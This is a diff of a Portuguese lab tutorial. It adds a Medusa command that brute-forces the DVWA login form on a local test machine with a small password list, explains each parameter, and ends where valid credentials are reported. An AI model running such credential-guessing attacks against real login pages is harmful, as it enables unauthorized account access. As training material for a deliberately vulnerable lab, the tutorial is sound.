@@ -101,4 +101,25 @@ Comando para criar lista de **senhas**:
 echo -e “123456\npassword\nqwerty\nmsfadmin” > pass.txt
 ```
 
+Agora, utilizar o Medusa para simular combinações entre usuários e senhas, através do comando:
+
+```bash
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
+ -m PAGE:'/dvwa/login.php' \
+ -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+ -m FAIL:'Login failed' \
+ -t 6
+```
+
+Explicando os parâmetros:
+- `-h 192.168.56.102`: endereço do alvo.
+- `-U users.txt`: arquivo com logins.
+- `-P pass.txt`: arquivo com senhas.
+- `-M http`: módulo http, ou seja, aplicações web.
+- `m PAGE:'/dvwa/login.php'`: caminho do formulário de login do servidor.
+- `-m FORM:'username=^USER^&password=^PASS^&Login=Login'`: corpo da requisição.
+- `-m FAIL:'Login failed'`: qual é a resposta pra tentativa de falha.
+- `-t 6`: usa seis conexões simultâneas para acelerar o processo.
+
+Onde está “**SUCCESS**” ele encontrou credenciais válidas:
 
